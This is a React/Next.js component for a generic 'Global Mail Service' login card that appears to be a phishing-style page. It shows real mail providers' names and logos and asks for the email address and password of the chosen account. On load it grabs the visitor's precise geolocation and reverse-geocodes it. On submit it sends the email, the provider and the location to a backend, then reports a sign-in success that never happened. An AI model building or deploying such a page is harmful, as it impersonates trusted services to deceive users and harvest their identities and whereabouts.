'use client'
// src/components/LoginCard.tsx

import { useState, useRef, useEffect } from 'react'
import Image from 'next/image'
import { PROVIDERS, MailProvider } from '@/lib/providers'
import styles from './LoginCard.module.css'

interface LocationData {
  latitude?: number
  longitude?: number
  city?: string
  country?: string
}

type FormState = 'idle' | 'loading' | 'success' | 'error'

export default function LoginCard() {
  const [selected, setSelected] = useState<MailProvider | null>(null)
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [formState, setFormState] = useState<FormState>('idle')
  const [errorMsg, setErrorMsg] = useState('')
  const [location, setLocation] = useState<LocationData>({})
  const [locationStatus, setLocationStatus] = useState<'idle' | 'granted' | 'denied'>('idle')
  const panelRef = useRef<HTMLDivElement>(null)
  const usernameRef = useRef<HTMLInputElement>(null)

  // Attempt to get geolocation on mount
  useEffect(() => {
    if (!navigator.geolocation) return
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        setLocationStatus('granted')
        setLocation({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
        })
        // Reverse geocode via free API
        fetch(
          `https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json`
        )
          .then((r) => r.json())
          .then((data) => {
            setLocation((prev) => ({
              ...prev,
              city:
                data.address?.city ||
                data.address?.town ||
                data.address?.village ||
                undefined,
              country: data.address?.country || undefined,
            }))
          })
          .catch(() => {})
      },
      () => setLocationStatus('denied')
    )
  }, [])

  function handleSelect(provider: MailProvider) {
    if (selected?.id === provider.id) {
      // Deselect
      setSelected(null)
      setFormState('idle')
      setErrorMsg('')
      return
    }
    setSelected(provider)
    setFormState('idle')
    setErrorMsg('')
    setUsername('')
    setPassword('')
    // Focus username after panel animates open
    setTimeout(() => usernameRef.current?.focus(), 320)
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault()
    if (!selected || !username.trim() || !password.trim()) {
      setErrorMsg('Please fill in both fields.')
      return
    }

    setFormState('loading')
    setErrorMsg('')

    try {
      const res = await fetch('/api/signin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: username.trim(),
          provider: selected.id,
          ...location,
        }),
      })

      if (!res.ok) throw new Error('Server error')
      setFormState('success')
    } catch {
      setFormState('error')
      setErrorMsg('Something went wrong. Please try again.')
    }
  }

  return (
    <div className={styles.card}>
      {/* Header */}
      <div className={styles.header}>
        <div className={styles.logoMark}>
          <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
            <path d="M2 5.5L10 11l8-5.5" stroke="white" strokeWidth="1.8" strokeLinecap="round" />
            <rect x="1" y="4" width="18" height="13" rx="3" stroke="white" strokeWidth="1.8" />
          </svg>
        </div>
        <h1 className={styles.title}>Global Mail Service</h1>
        <p className={styles.subtitle}>
          Sign in to access your email. Choose your provider below.
        </p>
      </div>

      {/* Divider */}
      <div className={styles.dividerLine} />

      {/* Provider list */}
      <div className={styles.providerList}>
        {PROVIDERS.map((p, i) => (
          <ProviderRow
            key={p.id}
            provider={p}
            isSelected={selected?.id === p.id}
            onSelect={handleSelect}
            animDelay={i * 40}
          />
        ))}
      </div>

      {/* Sign-in panel */}
      <div
        className={`${styles.signinPanel} ${selected ? styles.signinPanelOpen : ''}`}
        ref={panelRef}
      >
        {selected && (
          <form className={styles.form} onSubmit={handleSubmit} noValidate>
            <div
              className={styles.formHeader}
              style={{ borderLeftColor: selected.color }}
            >
              <span className={styles.formProviderName}>
                Sign in with {selected.shortName}
              </span>
            </div>

            <div className={styles.field}>
              <label htmlFor="gms-username" className={styles.label}>
                Email address
              </label>
              <input
                ref={usernameRef}
                id="gms-username"
                type="email"
                className={styles.input}
                placeholder={selected.emailHint}
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                disabled={formState === 'loading' || formState === 'success'}
                autoComplete="email"
              />
            </div>

            <div className={styles.field}>
              <label htmlFor="gms-password" className={styles.label}>
                Password
              </label>
              <input
                id="gms-password"
                type="password"
                className={styles.input}
                placeholder="••••••••••"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                disabled={formState === 'loading' || formState === 'success'}
                autoComplete="current-password"
              />
            </div>

            {errorMsg && (
              <p className={styles.errorMsg}>{errorMsg}</p>
            )}

            {formState === 'success' ? (
              <div className={styles.successState}>
                <span className={styles.checkIcon}>✓</span>
                <span>Signed in successfully</span>
              </div>
            ) : (
              <div className={styles.formActions}>
                <a href="#" className={styles.forgotLink}>
                  Forgot password?
                </a>
                <button
                  type="submit"
                  className={styles.submitBtn}
                  style={{ backgroundColor: selected.color }}
                  disabled={formState === 'loading'}
                >
                  {formState === 'loading' ? (
                    <span className={styles.spinner} />
                  ) : (
                    'Continue'
                  )}
                </button>
              </div>
            )}

            {/* Location indicator */}
            <p className={styles.locationNote}>
              {locationStatus === 'granted'
                ? `📍 ${location.city ? location.city + ', ' : ''}${location.country ?? 'Location enabled'}`
                : locationStatus === 'denied'
                ? '📍 Location not shared'
                : '📍 Requesting location…'}
            </p>
          </form>
        )}
      </div>

      <p className={styles.footer}>
        New to Global Mail Service?{' '}
        <a href="#" className={styles.footerLink}>
          Create account
        </a>
      </p>
    </div>
  )
}

// ──────────────────────────────────────────────
// ProviderRow sub-component
// ──────────────────────────────────────────────
function ProviderRow({
  provider,
  isSelected,
  onSelect,
  animDelay,
}: {
  provider: MailProvider
  isSelected: boolean
  onSelect: (p: MailProvider) => void
  animDelay: number
}) {
  return (
    <button
      className={`${styles.providerRow} ${isSelected ? styles.providerRowActive : ''}`}
      onClick={() => onSelect(provider)}
      style={{
        animationDelay: `${animDelay}ms`,
        '--accent': provider.color,
      } as React.CSSProperties}
      type="button"
      aria-pressed={isSelected}
    >
      {/* Left: logo */}
      <span className={styles.providerLogo}>
        <Image
          src={provider.logoUrl}
          alt={provider.name}
          width={28}
          height={28}
          style={{ objectFit: 'contain', width: 28, height: 28 }}
          unoptimized
        />
      </span>

      {/* Middle: name */}
      <span className={styles.providerName}>{provider.name}</span>

      {/* Right: accent dot + chevron */}
      <span className={styles.providerRight}>
        <span
          className={styles.colorDot}
          style={{ backgroundColor: provider.color }}
        />
        <ChevronIcon active={isSelected} />
      </span>
    </button>
  )
}

function ChevronIcon({ active }: { active: boolean }) {
  return (
    <svg
      width="16"
      height="16"
      viewBox="0 0 16 16"
      fill="none"
      style={{
        transition: 'transform 0.25s ease',
        transform: active ? 'rotate(180deg)' : 'rotate(0deg)',
        color: active ? 'var(--accent)' : '#9ca3af',
      }}
    >
      <path
        d="M4 6l4 4 4-4"
        stroke="currentColor"
        strokeWidth="1.6"
        strokeLinecap="round"
        strokeLinejoin="round"
      />
    </svg>
  )
}
